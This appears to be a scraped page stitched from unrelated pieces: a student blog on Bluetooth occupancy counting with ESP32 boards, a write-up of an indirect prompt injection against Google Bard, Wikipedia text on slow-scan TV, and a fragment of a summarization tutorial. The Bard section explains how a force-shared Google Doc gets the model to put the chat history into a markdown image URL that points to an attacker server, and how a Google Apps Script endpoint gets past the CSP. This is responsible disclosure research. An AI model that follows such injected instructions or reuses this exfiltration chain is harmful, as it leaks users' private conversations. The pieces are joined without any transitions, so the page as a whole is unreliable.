<li>LoRa could be an option, depending on the distribution of beacons. Here's some <a href="https://medium.com/home-wireless/what-is-the-range-of-a-lora-radio-411261e35f46">range testing numbers</a>, though this is affected by the antenna's gain and locations (here's <a href="https://yosensi.io/posts/what_is_the_real_range_of_lora/">another test</a> with a far higher range).</li>
</ul>
</li>
<li>How can we collect the data?
<ul>
<li>Should we use a time series database?</li>
</ul>
</li>
<li>How can we analyze the data?
<ul>
<li>Can we predict trends in the longer time spans, excluding special events like homecoming weekend, finals week, etc?</li>
</ul>
</li>
</ul>
<div><p>I found these questions tumbling around in my head, so I began with some preliminary testing - writing some simple code to count the number of devices detected on my laptop's Bluetooth adapter. Success - it was surprisingly easy to write code to scan for <code>x</code> seconds every <code>y</code> seconds and save it to a SQLite database at regular intervals. So, I carried my laptop to dining halls, Chick-Fil-A, Starbucks, etc and waited.
</p><p>


And waited.
</p><p>



And waited.
</p><p>







I spent a lot of time collecting data while sipping on coffees and milkshakes. You know, for data collection purposes. This is all very academic, of course.
</p><p>

​No other reason.
</p><p>

​Anyway, accuracy - In smaller areas (like a single-room Starbucks), I found the count to be pretty accurate. At the very least it reflected trends in occupancy very quickly. When more people arrived, the charts quickly climbed. </p></div>
<p>In larger areas like dining halls, the counts seemed accurate by my guesstimate. There's no way for me to count everyone in a dining hall, with complicated layouts and different seating areas, especially when I'm not certain of my bluetooth adapter's range (is it picking up people on the terrace through the walls? etc). But it most definitely matched the trends around class changes - when classes got out, people went to eat, which rapidly increased the number of people I saw, and the number of beacons my laptop detected.</p>
<h2 id="long-term-deployment">Long term deployment</h2>
<p>Okay, sounds great, it looks like we have some kind of method validation. But I don't plan on cloning myself in every dining hall and sitting 24/7, so what can we do to create a small device to collect the same data?</p>
<h2 id="raspberry-pi-maybe">Raspberry Pi - Maybe?</h2>
<p>My first thought was - Raspberry Pi Zero W. It's small and cheap, has Wi-Fi and Bluetooth, and definitely is in stock somewhere on Earth. </p>
<p>I rewrote my simple code (in Rust, no less!) to handle everything gracefully (reboots, no network, adapter loss, etc). Linux Bluetooth is incredibly painful to handle in a headless way. Binding to DBus requires cross-compiler magic and not even Cross was getting me out of it. After struggling enough through a million different compiler flags, a power outage that caused me to lose my progress on the Makefile (also, yes I use Make with Rust), and at last setting up a QEMU bridge, I was able to get my binary to run on my Pi. I even wrote all of the patching magic to make it connect to Wi-Fi (try doing THAT headlessly, when there's a portal you have to sign into!), install the necessary libraries on start-up, make a service to run my executable, and automagically update when I push a new update. Okay, that's a lot of moving parts. Let's boot it up and hope it works...</p>
<p><strong>Nothing.</strong></p>
<p>That's right, absolutely nothing worked. Not even the automagic wifi connection via Mac address fiddling hacks. </p>
<h2 id="moving-on">Moving on</h2>
<p>If you're smarter than me, you may have realized that's <del>a bit</del> WAY too much complexity. We really do not need a whole Linux kernel at all. We need two things - reliable Wi-Fi, and reliable Bluetooth. Okay, so shelve the Pi Zero W and Orange Pi Zero W I bought. What's this nonsense about a device that can do these two things at an even cheaper price and smaller footprint?...</p>
<h2 id="esp32"><strong>ESP32</strong>?</h2>
<p><img src="https://matthew.science/imgs/occupancy/esp32c3.png" alt="ESP32C3"></p>
<p>On paper, it looks great - Wi-Fi, Bluetooth, extremely low power usage (🌱🌍♻️🌿🌞💚), very cheap, and very tiny.</p>
<p>I purchased one off of Amazon since I didn't want to wait for overseas shipping (not losing momentum in a nerd snipe like this is <strong>CRITICAL</strong>). I bought a random <a href="https://www.amazon.com/dp/B072HBW53G">ESP32-WROOM-32 with an OLED display</a>, since I thought it would be cool to display the data on the screen live. I rewrote my data collection code in C++ form (away from Rust!) since the Rust ecosystem for ESP32 is not all the way there yet.</p>
<p>After fidgeting with the display code enough to get it working (<code>SSD1306Wire display(0x3c, 5, 4);</code> if you're wondering), it worked great. I asked campus IT to whitelist the MAC address, wrote up some Cloudflare functions into a D1 database as my data ingest, and set out to work.</p>
<h2 id="deployment">Deployment</h2>
<p>I <del>hid</del> placed my data collection device in my campus library on a crisp fall morning, sat myself down at my laptop, saw the data rolling in, and did a silent celebration. Off to my Principles class to learn about scope rules then...</p>
<figure>
  <img src="https://matthew.science/imgs/occupancy/chartfall.png" alt="A picture showing my chart rapidly falling as it peaks">
  <figcaption>Why did everyone leave Swem library and never come back???</figcaption>
</figure>
<h3 id="obstacles">Obstacles</h3>
<p>One major problem that I ran into was the poor specs of the random ESP32 device I had. </p>
<p>The above issue shows the device crashing at about 250 devices. At first, I was worried this was a bug with the result count being stored in a 1-byte number, like a u8 (thus capping at ~255 devices). A quick <code>Serial.print</code> made me realize it would crash also at about 249, 265, etc - randomly around this area. So, not a bit-overflow issue (at least, not in the integer part!).</p>
<p>Our library fills up quickly with studious twamps - it wouldn't last a minute in finals season if it couldn't handle any more than that. </p>
<h3 id="the-problem-identified">The problem - identified</h3>
<p>By saving the results during a scan into a data structure until the end of the scan, it piled up data about the device's scan strength, advertised services, manufacturer ID, etc. While this seems like great data to collect, I had one thing in mind - the number of unique devices (for now). </p>
<p>By debugging the heap size constantly, I realized that the scan results was filling up the small amount of RAM it had. This was bad news - at first, I didn't see a way to still collect the data while not actually collecting the data.</p>
<h3 id="resolution">Resolution</h3>
<p>I decided to brush up on my C++ data structures programming and write a small hashset. After all, the data structure for the scan results was very bloated - if I could override that, I would be able to control the heap size more closely, right?</p>
<p>On every callback, then, we'd insert the MAC address into a hashset, then clear the built-in result structure to allow for more memory.</p>
<p><img src="https://matthew.science/imgs/occupancy/code.png" alt="Code"></p>
<p>Unfortunately, this is not ideal - <strong>if and only if</strong> there's some results to check for duplicates, the callback is only called on new devices. When we clear this every time, we give it amnesia, thus every single BLE advertisement packet causes a callback. We <em>do</em> check for duplicates in <code>addToSet</code> (it is a hashset!), but this will definitely cause hundreds of duplicate callbacks to our hashset, <em>and</em> heap thrashing since we're allocating and deallocating the result structure every single callback. That's okay (for now), it's better to repeatedly check a hashmap with no more than 1000 entries (a very quick procedure) very often, than have our capacity limited to 250 people. </p>
<h3 id="more-obstacles">More obstacles</h3>
<p>Okay, we now have a perfect way to scan for devices for long periods of time. Oh would you look at the calendar - it's fall break! I'll leave it in the library and have it report back so I can see how packed it is over break (yes, there will be studying done on campus over break - we are a nerdy college). Perfect, even some long-term testing over the 5 day weekend! Surely nothing bad will happ-</p>
<figure>
  <img src="https://matthew.science/imgs/occupancy/fallbreak.png" alt="A picture showing my chart rapidly falling again">
  <figcaption>That's about 400 devices before the crash - on a fall break day in a college. As mentioned - nerdy.</figcaption>
</figure>
<p>Okay, awesome. Another issue, one that manifests itself after 3 hours of use with zero indication of issues. After fighting with the debugger for long enough, and even tossing in periodic reboots (it boots very quick so this adds almost no time at all), I chalked this up to a bad board/BT adapter - it seemed to run, but it instantly returned zero devices on every scan. That's okay - while I was messing with this Amazon one, I bought quite a few others, along with the rest I've bought over the course of the whole project.</p>
<figure>
  <img src="https://matthew.science/imgs/occupancy/devices.jpeg" alt="A picture showing several devices I've purchased over the course of this project">
  <figcaption>Seeed Studio XIAO ESP32S3/C3, WaveShare ESP32S3 Zero, Unbranded ESP32-WROOM with OLED, Orange Pi Zero W (untouched), Raspberry Pi Zero W (L-&gt;R, T-&gt;D)</figcaption>
</figure>
<p>After testing all of these, the only one reliable to work for long periods of time (one month currently) was the XIAO ESP32C3/S3. Both work acceptably, but I decided to go with the C3, since it's RISC-V, which is awesome (for my ideals), and since it's cheaper, which is also awesome (for my wallet).</p>
<p>Another benefit of switching to a better manufacturer is more SRAM - I was able to switch away from my hand-written hashmap implementation, since the RAM was able to hold the results data structure much better without crashing. I've seen as high as 1000 devices detected with no sign of slowing down. This probably reduces CPU usage as well - no more heap and callback churn!</p>
<p>After I found a device that worked far better, I moved my deployment location to my dorm room window so I would have an easier deployment cycle - here it is with numerous academic buildings in the background.</p>

</figure>
<h2 id="final-data-collection">Final data collection</h2>
<p>Now that I've gotten my data collection working successfully, let's look at the data for one day.</p>
<figure>
  <img src="https://matthew.science/imgs/occupancy/chart.png" alt="A screenshot of a chart showing occupancy stats - it shows peaks at times where you'd expect there to be">
  <figcaption>Data collection for one day. Notice the peaks? That's right about the time that classes switch.</figcaption>
</figure>
<p>There's something to note about this. The device might be in my dorm, but it largely is not limited to the dorm's own inhabitants. Otherwise, it would be at its max in the early morning and drop as the day went on. If I wanted it to measure exclusively dorm inhabitants, I would probably place it more centrally (instead of out a window), but it still would not be great at this, since dorms are the <em>worst</em> at permeating bluetooth signals through many walls.</p>
<p>That's okay, I'll just keep that in mind as I analyze the data - it's mostly picking up students as they go into the two nearest academic buildings, not the dorm inhabitants. </p>
<p>The peaks start up around 7:50, right before the 8 am classes start in Ewell and Washington halls. I suspect this is detecting the students initially leaving dorms, shuffling along to their classes, and the drop is as students enter the buildings. Then, the peak at 8:50 is probably as students leave their 8 AMs and go to their 9 AMs, entering the range of the device only to immediately leave it as the numbers drop at 9 AM. Same for 9:50/10 AM, and 10:50/11 AM. These are all class switch times.</p>
<p>These all point to method validation - it seems like this device really is good at tracking trends in the movement of students around it. The antenna is also seemingly very high range - I didn't expect it to reach the ~160ft into Washington Hall, and the ~100ft into Ewell. The altitude of being on the 3rd floor probably helps with it, though.</p>
<h2 id="time-series-forecasting">Time series forecasting?</h2>
<p>This seems like the perfect target for time series forecasting, like with <a href="https://neuralprophet.com/">NeuralProphet</a>. The data is chock-full of hourly, daily, and weekly trends. I added the functionality to predict these trends and so far, it's very good at predicting daily trends; the longer (week, month, and season-long) trends will likely converge after enough data is collected.</p>
<h2 id="further-thoughts">Further thoughts</h2>
<p>Of course, this is not a solved project. I've written the code to parse this into a Cloudflare DB, into Grafana, and some forecasting, but there's more to be done. </p>
<p>I performed an enormous amount of literature review over the course of this project - reading dozens of research papers on the topic, finding out what works and what didn't, what I would try and what I would avoid. Many questions are raised in these papers, that I still want to answer.</p>
<figure>

  <figcaption>Hours of doc review</figcaption>
</figure>
<p>For example, how well of a proxy is a BLE beacon count for actual population count? </p>
<ul>
<li>Does this depend on the demographics? How do we find a correction factor (like for <code>x</code> beacons, there's roughly <code>0.7x</code> people, given the multiple devices people carry around)? </li>
<li>For example, in the computer science building, is the linear rate to population higher, since we carry so many gadgets around? Or is it lower, because we know to turn off Bluetooth when not using it (BT firmware zero days, you see)? </li>
<li>Or in the staff building, is it lower compared to students, since they are less likely to carry around a bunch of tech?</li>
<li>Maybe the rate is lower in a dining hall, since not many people are using multiple devices like they would in a lecture hall (laptop, iPad, etc for notes)?</li>
</ul>
<p>Other questions came to mind, like:</p>
<ul>
<li>Can we improve the accuracy by setting an RSSI minimum, for which devices weaker than it do not count, to ensure only those who are really nearby get counted?</li>
<li>Can we improve the accuracy by filtering by manufacturer ID, so it's only Apple + common Android manufacturers? Would this help, since Apple Watches, AirPods, MacBooks, etc would all still add to the count?</li>
<li>What kinds of privacy accomodations do I need to keep in mind? I already only track pure beacon numbers. I don't track actual MAC addresses like Bluefox did, but do I need to add noise to the data? Is the existing data noisy enough to avoid deanonymization? Is it realistic to identify a single person in the data without anything but the number of devices?</li>
<li>What's the best scan duration? Too quick, and it won't find all of the hundreds of devices that exist. Too long, and we risk inaccuracy (counting devices that have since left, data showing large drifts within short periods of time, etc). 
<ul>
<li>Is a dynamic scan length best? (Think about cooking a bag of popcorn - when a period of time passes without any change, you're done)</li>
</ul>
</li>
</ul>
<p>Lots of questions to answer. I plan on validating my data with real-world population data collected in a place where it's easy to get the "ground truth". Maybe I will reach out to a place on campus who either already tracks occupancy (the gym with swipe in/out), or will investigate more thoroughly in a place where it is trivial to do so myself (limited entry/exit, like a dining hall, or a Starbucks).</p>
<h2 id="further-work">Further work</h2>
<p>I am not sure whether I will be taking this further - I'm currently talking to some professors about the use cases for some university committees, or perhaps further academic (and hopefully publish-worthy) research. I am also considering selling it to brick-and-mortar businesses that want to measure occupancy trends. It's a pretty packaged up solution - everything from the front-end to the back-end is built already. This is vaguely what the setup looks like for any given deployment:</p>
<ul>
<li>Set up Wi-Fi in config (either have network whitelist the MAC if it's a portal, or connect to open/password protected Wi-Fi on boot)</li>
<li>Change machine and site IDs in config</li>
<li>Plug device/devices into outlet in central/convenient locations</li>
<li>Set up Grafana dashboard to read each device from backend</li>
<li>Set up Grafana dashboard to read predicted trends as well, in separate charts</li>
</ul>
<p>If you're interested in any of this, please let me know! I'd love to hear from you.</p>

<div id="readability-page-1" class="page"><section>
    <p>Recently Google Bard got some <a href="https://blog.google/products/bard/google-bard-new-features-update-sept-2023/">powerful updates</a>, including Extensions. Extensions allow Bard to access YouTube, search for flights and hotels, and also to access a user’s personal documents and emails.</p>
<p><strong>So, Bard can now access and analyze your Drive, Docs and Gmail!</strong></p>
<p>This means that it analyzes untrusted data and will be susceptible to Indirect Prompt Injection.</p>
<p>I was able to quickly validate that Prompt Injection works by pointing Bard to some older YouTube videos I had put up and ask it to summarize, and I also tested with <code>Google Docs</code>.</p>
<p>Turns out that it followed the instructions:</p>
<p><a href="https://twitter.com/wunderwuzzi23/status/1704198612039737845"><img src="https://embracethered.com/blog/images/2023/google-bard-pi.png" alt="Google Bard Prompt Injection Demo"></a></p>
<p>At that point it was clear that things will become a lot more interesting.</p>
<p>A shout out to <a href="https://twitter.com/rez0__">Joseph Thacker</a> and <a href="https://twitter.com/KGreshake">Kai Greshake</a> for brainstorming and collaborating on this together.</p>
<h2 id="whats-next">What’s next?</h2>
<p>Indirect Prompt Injection attacks via Emails or Google Docs are interesting threats, because these can be delivered to users without their consent.</p>
<p><strong>Imagine an attacker force-sharing Google Docs with victims!</strong></p>
<p>When the victim searches or interacts with the attacker’s document using Bard the prompt injection can kick in!</p>
<p><strong>Scary stuff!</strong></p>
<p>A common vulnerability in LLM apps is chat history exfiltration via rendering of hyperlinks and images. The question was, how might this apply to Google Bard?</p>
<h2 id="the-vulnerability---image-markdown-injection">The Vulnerability - Image Markdown Injection</h2>
<p>When Google’s LLM returns text it can return markdown elements, which Bard will render as HTML! This includes the capability to render images.</p>
<p>Imagine the LLM returns the following text:</p>
<pre tabindex="0"><code>![Data Exfiltration in Progress](https://wuzzi.net/logo.png?goog=[DATA_EXFILTRATION])
</code></pre><p>This will be rendered as an HTML image tag with a <code>src</code> attribute pointing to the <code>attacker</code> server.</p>
<pre tabindex="0"><code>&lt;img src="https://wuzzi.net/logo.png?goog=[DATA_EXFILTRATION]"&gt;
</code></pre><p>The browser will automatically connect to the URL without user interaction to load the image.</p>
<p>Using the power of the LLM we can summarize or access previous data in the chat context and append it accordingly to the URL.</p>
<p><a href="https://embracethered.com/blog/images/2023/bard-exfil-logo.png"><img src="https://embracethered.com/blog/images/2023/bard-exfil-logo.png" alt="Google Bard Data Exfil"></a></p>
<p>When writing the exploit a prompt injection payload was quickly developed that would read the history of the conversation, and form a hyperlink that contained it.</p>
<p>However image rendering was blocked by Google’s Content Security Policy.</p>
<h2 id="content-security-policy-bypass">Content Security Policy Bypass</h2>
<p>To render images from an attacker controlled server there was an obstacle. Google has a Content Security Policy (CSP) that prevents loading images from arbitary locations.</p>
<p><a href="https://embracethered.com/blog/images/2023/bard-csp2.png"><img src="https://embracethered.com/blog/images/2023/bard-csp2.png" alt="CSP policy"></a></p>
<p>The CSP contains locations such as <code>*.google.com</code> and <code>*.googleusercontent.com</code>, which seemed quite broad.</p>
<p><strong>It seemed that there should be a bypass!</strong></p>
<p>After some research I learned about <code>Google Apps Script</code>, that seemed most promising.</p>
<p><code>Apps Scripts</code> are like Office Macros. And they can be invoked via a URL and run on the <code>script.google.com</code> (respectiveley <code>googleusercontent.com</code>) domains!!</p>
<p><img src="https://embracethered.com/blog/images/2023/google-bard-appscript.png" alt="appsscript bypass"></p>
<p>So, this seemed like a winner!</p>
<h2 id="writing-the-bard-logger">Writing the Bard Logger</h2>
<p>Equipped with that knowledge a “Bard Logger” in <code>Apps Script</code> was implemented.</p>
<p>The logger writes all query parameters appended to the invocation URL to a <code>Google Doc</code>, which is the exfiltration destination.</p>
<p><a href="https://embracethered.com/blog/images/2023/google-bard-logger.png"><img src="https://embracethered.com/blog/images/2023/google-bard-logger.png" alt="Bard Logger"></a></p>
<p>For a second it seemed like it’s not possible to expose such an endpoint anonymously, but after some clicking through the <code>Apps Script</code> UI I found a setting to make it have no authentication.</p>
<p>So, now all the pieces were ready:</p>
<ol>
<li>Google Bard is vulnerable to Indirect Prompt Injection via data from Extensions</li>
<li>There is vulnerabilty in Google Bard that allows rendering of images (zero click)</li>
<li>A malicious Google Doc Prompt Injection Instructions to exploit the vulnerability</li>
<li>A logging endpoint on <code>google.com</code> to receive the data when the image is loaded</li>
</ol>
<p>But, will it work?</p>
<h2 id="demo-and-responsible-disclosure">Demo and Responsible Disclosure</h2>
<p>A video tells more than a 1000 words, so check it out!</p>

<p>
  <iframe src="https://www.youtube.com/embed/CKAED_jRaxw" allowfullscreen="" title="YouTube Video"></iframe>
</p>

<p>In the video you can see how the chat history of the user is exfiltrated once the malicious <code>Google Doc</code> is brought into the chat context.</p>
<p>If you prefer screenshots over video, look further below.</p>
<h2 id="show-me-the-shell-code">Show me the Shell Code</h2>
<p><strong>Shell Code is natural language these days.</strong></p>
<p>This is the <code>Google Doc</code> including the payload used to perform the prompt injection and data exfiltration:</p>
<p><a href="https://embracethered.com/blog/images/2023/google-bard-payload.png"><img src="https://embracethered.com/blog/images/2023/google-bard-payload.png" alt="Bard Renders Image"></a></p>
<p>The exploit leverages the power of the LLM to replace the text inside the image URL, we give a few examples also to teach the LLM where to insert the data properly.</p>
<p>This was not needed with other Chatbots in the past, but Google Bard required some “in context learning” to complete the task.</p>
<h2 id="screenshots">Screenshots</h2>
<p>In case you don’t have time to watch the video, here are the key steps:</p>
<ul>
<li>
<p>First the user chats with Bard providing some text
<a href="https://embracethered.com/blog/images/2023/bard-data-exfil-data.png"><img src="https://embracethered.com/blog/images/2023/bard-data-exfil-data.png" alt="Bard Renders Image"></a></p>
</li>
<li>
<p>User navigates to the Google Doc (The Bard2000), which leads to injection of the attacker instructions, and rendering of the image:
<a href="https://embracethered.com/blog/images/2023/Bard-Exfil-Image-Markdown.png"><img src="https://embracethered.com/blog/images/2023/Bard-Exfil-Image-Markdown-crop.png" alt="Bard Renders Image"></a></p>
</li>
<li>
<p>The attacker receives the data via the Bard Logger Apps Script into a Google Doc:
<a href="https://embracethered.com/blog/images/2023/Bard-Exfil-BardLogger-Results.png"><img src="https://embracethered.com/blog/images/2023/Bard-Exfil-BardLogger-Results.png" alt="bard logger results"></a></p>
</li>
<li>
<p><strong>That’s it. Mission accomplished.</strong></p>
</li>
</ul>
<p>This chain was a bit more complex as others we discussed previously (like Bing Chat, ChatGPT or Claude), because a bypass for the <code>CSP</code> had to be found.</p>
<h2 id="googles-fix">Google’s Fix</h2>
<p>The issue was reported to Google VRP on September, 19 2023. After an inquiry on October 19, 2023 to check on status, since I wanted to demo at <a href="https://ekoparty.org/eko2023-agenda/indirect-prompt-injections-in-the-wild-real-world-exploits-and-mitigations/">Ekoparty 2023</a>, Google confirmed it’s fixed and gave green light for including the demo in the talk.</p>
<p>It’s not yet entirely clear what the fix was at the moment. The CSP was not modified, and images still render - so, it seems some filtering was put in place to prevent insertion of data into the URL. That will be something to explore next!</p>
<h2 id="conclusion">Conclusion</h2>
<p>This vulnerability shows the power and degrees of freedom an adversary has during an Indirect Prompt Injection attack.</p>
<p>Thanks to the Google Security and Bard teams for fixing this issue promptly.</p>
<p>Cheers.</p>

It was deemed sufficient to use 120 lines and about 120 pixels per line to transmit a black-and-white still picture within a 3&nbsp;kHz telephone channel. First live tests were performed on the 11-meter ham band&nbsp;–  which was later given to the <a href="https://en.wikipedia.org/wiki/Citizen%27s_band_radio" title="Citizen's band radio">CB</a> service in the US.

<p>Like the similar <a href="https://en.wikipedia.org/wiki/Radiofax" title="Radiofax">radiofax</a> mode, SSTV is an <a href="https://en.wikipedia.org/wiki/Analog_signal" title="Analog signal">analog signal</a>. SSTV uses <a href="https://en.wikipedia.org/wiki/Frequency_modulation" title="Frequency modulation">frequency modulation</a>, in which every different value of <a href="https://en.wikipedia.org/wiki/Brightness" title="Brightness">brightness</a> in the image gets a different audio frequency. In other words, the signal frequency shifts up or down to designate brighter or darker pixels, respectively. Color is achieved by sending the brightness of each color component (usually red, green and blue) separately. This signal can be fed into an <a href="https://en.wikipedia.org/wiki/Single-sideband_modulation" title="Single-sideband modulation">SSB</a> transmitter, which in part modulates the <a href="https://en.wikipedia.org/wiki/Carrier_signal" title="Carrier signal">carrier signal</a>.
</p><p>There are a number of different modes of transmission, but the most common ones are <i>Martin M1</i> (popular in Europe) and <i>Scottie S1</i> (used mostly in the USA).<sup id="cite_ref-Langner_7-0"><a href="#cite_note-Langner-7">[7]</a></sup> Using one of these, an image transfer takes 114 (M1) or 110 (S1) seconds. Some black and white modes take only 8 seconds to transfer an image.

<p>A calibration header is sent before the image. It consists of a 300-millisecond leader tone at 1,900&nbsp;Hz, a 10&nbsp;ms break at 1,200&nbsp;Hz, another 300-millisecond leader tone at 1,900&nbsp;Hz, followed by a digital VIS (vertical interval signaling) code, identifying the transmission mode used. The VIS consists of <a href="https://en.wikipedia.org/wiki/Bit" title="Bit">bits</a> of 30 milliseconds in length. The code starts with a start bit at 1,200&nbsp;Hz, followed by 7 data bits (<a href="https://en.wikipedia.org/wiki/Least_significant_bit" title="Least significant bit">LSB</a> first; 1,100&nbsp;Hz for 1, 1,300&nbsp;Hz for 0). An even <a href="https://en.wikipedia.org/wiki/Parity_bit" title="Parity bit">parity bit</a> follows, then a stop bit at 1,200&nbsp;Hz.

<p>A transmission consists of horizontal <a href="https://en.wikipedia.org/wiki/Line_(video)" title="Line (video)">lines</a>, scanned from left to right. The color components are sent separately one line after another. The color encoding and order of transmission can vary between modes. Most modes use an <a href="https://en.wikipedia.org/wiki/RGB_color_model" title="RGB color model">RGB color model</a>; some modes are black-and-white, with only one channel being sent; other modes use a YC color model, which consists of <a href="https://en.wikipedia.org/wiki/Luminance" title="Luminance">luminance</a> (Y) and <a href="https://en.wikipedia.org/wiki/Chrominance" title="Chrominance">chrominance</a> (R–Y and B–Y). The modulating frequency changes between 1,500 and 2,300&nbsp;Hz, corresponding to the intensity (<a href="https://en.wikipedia.org/wiki/Brightness" title="Brightness">brightness</a>) of the color component. The modulation is analog, so even though the horizontal resolution is often defined as 256 or 320 pixels, they can be sampled using any rate. The image <a href="https://en.wikipedia.org/wiki/Aspect_ratio_(image)" title="Aspect ratio (image)">aspect ratio</a> is conventionally 4:3. Lines usually end in a 1,200&nbsp;Hz horizontal synchronization pulse of 5&nbsp;milliseconds (after all color components of the line have been sent); in some modes, the synchronization pulse lies in the middle of the line.

<p>¹ Martin and Scottie modes actually send 256 scanlines, but the first 16 are usually grayscale.</p>
<p>The mode family called AVT (for <i>Amiga Video Transceiver</i>) was originally designed by Ben Blish-Williams (N4EJI, then AA7AS) for a custom modem attached to an Amiga computer, which was eventually marketed by AEA corporation.
</p><p>The Scottie and Martin modes were originally implemented as ROM enhancements for the Robot corporation SSTV unit. The exact line timings for the Martin M1 mode are given in this reference.<sup id="cite_ref-QEX_Cordesses_8-0"><a href="#cite_note-QEX_Cordesses-8">[8]</a></sup>
</p><p>The Robot SSTV modes were designed by Robot corporation for their own SSTV unit.
</p><p>All four sets of SSTV modes are now available in various PC-resident SSTV systems and no longer depend upon the original hardware.

<p>AVT is an abbreviation of "Amiga Video Transceiver", software and hardware modem originally developed by "Black Belt Systems" (USA) around 1990 for the <a href="https://en.wikipedia.org/wiki/Amiga" title="Amiga">Amiga</a> home computer popular all over the world before the <a href="https://en.wikipedia.org/wiki/IBM_PC_compatible" title="IBM PC compatible">IBM PC</a> family gained sufficient audio quality with the help of special <a href="https://en.wikipedia.org/wiki/Sound_card" title="Sound card">sound cards</a>.  These AVT modes differ radically from the other modes mentioned above, in that they are synchronous, that is, they have no per-line horizontal synchronization pulse but instead use the standard VIS vertical signal to identify the mode, followed by a frame-leading digital pulse train which pre-aligns the frame timing by counting first one way and then the other, allowing the pulse train to be locked in time at any single point out of 32 where it can be resolved or demodulated successfully, after which they send the actual image data, in a fully synchronous and typically interlaced mode.
</p><p>Interlace, no dependence upon sync, and interline reconstruction gives the AVT modes a better noise resistance than any of the other SSTV modes. Full frame images can be  reconstructed with reduced resolution even if as much as 1/2 of the received signal was lost in a solid block of interference or fade because of the interlace feature. For instance, first the odd lines are sent, then the even lines. If a block of odd lines are lost, the even lines remain, and a reasonable reconstruction of the odd lines can be created by a simple vertical interpolation, resulting in a full frame of lines where the even lines are unaffected, the good odd lines are present, and the bad odd lines have been replaced with an interpolation. This is a significant visual improvement over losing a non-recoverable contiguous block of lines in a non-interlaced transmission mode. Interlace is an optional mode variation, however without it, much of the noise resistance is sacrificed, although the synchronous character of the transmission ensures that intermittent signal loss does not cause loss of the entire image. 
The AVT modes are mainly used in Japan and the United States. There is a full set of them in terms of black and white, color, and scan line counts of 128 and 256. Color bars and greyscale bars may be optionally overlaid top and/or bottom, but the full frame is available for image data unless the operator chooses otherwise. For receiving systems where timing was not aligned with the incoming image's timing, the AVT system provided for post-receive re-timing and alignment.

<p>In Valve's 2007 video game <i><a href="https://en.wikipedia.org/wiki/Portal_(video_game)" title="Portal (video game)">Portal</a></i>, there was an internet update of the program files on 3&nbsp;March 2010. This update gave a challenge to find hidden radios in each test chamber and bring them to certain spots to receive hidden signals. The hidden signals became part of an <a href="https://en.wikipedia.org/wiki/Alternate_reality_game" title="Alternate reality game">ARG</a>-style analysis by fans of the game hinting at a sequel of the game&nbsp;–  some sounds were of <a href="https://en.wikipedia.org/wiki/Morse_code" title="Morse code">Morse code</a> strings that implied the restarting of a computer system, while others could be decoded as purposefully low-quality SSTV images. When some of these decoded images were put together in the correct order, it revealed a decodable MD5 hash for a <a href="https://en.wikipedia.org/wiki/Bulletin-board_system" title="Bulletin-board system">bulletin-board system</a> phone number (425)822-5251. It provides multiple <a href="https://en.wikipedia.org/wiki/ASCII_art" title="ASCII art">ASCII art</a> images relating to the game and its potential sequel.<sup id="cite_ref-10"><a href="#cite_note-10">[10]</a></sup><sup id="cite_ref-11"><a href="#cite_note-11">[11]</a></sup><sup id="cite_ref-12"><a href="#cite_note-12">[12]</a></sup> The sequel, <i><a href="https://en.wikipedia.org/wiki/Portal_2" title="Portal 2">Portal 2</a></i>, was later confirmed. According to a hidden commentary node SSTV image from <i>Portal 2</i>, the BBS is running from a Linux-based computer and is linked to a 2400&nbsp;bit/s modem from 1987. It is hooked up in an unspecified Valve developer's kitchen. They kept spare modems in case one failed, and one did. The BBS only sends about 20&nbsp;megabytes of data in total.
</p><p>In the aforementioned sequel, <i>Portal 2</i>, there are four SSTV images. One is broadcast in a Rattman den. When decoded, this image is a very subtle hint towards the game's ending. The image is of a Weighted Companion Cube on the Moon. The other three images are decoded from a commentary node in another Rattman den. These 3 images are slides with bullet points on how the ARG was done, and what the outcome was, such as how long it took the combined internet to solve the puzzle (the average completion time was 7&nbsp;1/2 hours).<sup id="cite_ref-13"><a href="#cite_note-13">[13]</a></sup>
</p><p>In another video game, <i><a href="https://en.wikipedia.org/wiki/Kerbal_Space_Program" title="Kerbal Space Program">Kerbal Space Program</a></i>, there is a small hill in the southern hemisphere on the planet "Duna", which transmits a color SSTV image in Robot&nbsp;24 format. It depicts four astronauts standing next to what is either the Lunar Lander from the Apollo missions, or an unfinished pyramid. Above them is the game's logo and three circles.<sup id="cite_ref-14"><a href="#cite_note-14">[14]</a></sup> It emits sound if an object is near the hill.<sup>[<i><a href="https://en.wikipedia.org/wiki/Wikipedia:Citation_needed" title="Wikipedia:Citation needed"><span title="This claim needs references to reliable sources.

Using these methods were able to decrease latency by 20x, reduce costs by 50x and maintain entity density.</p> <p>By the end you'll end up with a GPT 3.5 model, (fine-tuned using Instructor's great tooling), capable of producing summaries that rival the effectiveness of Chain of Density <a href="https://arxiv.org/abs/2309.04269">[Adams et al.

Their novel method, Chain Of Density prompting, enhances AI-based text summarization, outperforming human-generated summaries.</p> <p>Initially, an AI produces a summary, then refines it through multiple iterations, adding missing article entities. Each iteration adds new article entities to the summary, keeping length consistent, leading to an entity-dense, informative summary called Chain Of Density.</p> <p>First introduced in the paper - <a href="https://arxiv.org/abs/2309.04269">From Sparse to Dense: GPT-4 Summarization with Chain of Density Prompting</a>. The team has found that this method is able to consistently beats similar summaries written by human annotators.</p> <details> <summary>Implementation Details</summary> <p>Note that our implementation uses a validator to ensure that the rewritten summary has a minimum length rather than a prompt. We also perform just 3 and not 5 rounds of rewrites, resulting in a lower final entity density.</p> </details> <h3 id="original-prompt">Original Prompt<a href="#original-prompt" title="Permanent link">¶</a></h3> <p>We can break down the original process into smaller api calls.

</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>A Missing Entity is:
</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>- Relevant: to the main story.
</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>- Specific: descriptive yet concise (5 words or fewer).
</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>- Novel; not in the previous summary.

</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>Guidelines:
</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>- The first summary should be long (4-5 sentences, -80 words) yet
</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>highly non-specific, containing little information beyond the
</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>entities marked as missing. Use overly verbose language and fillers
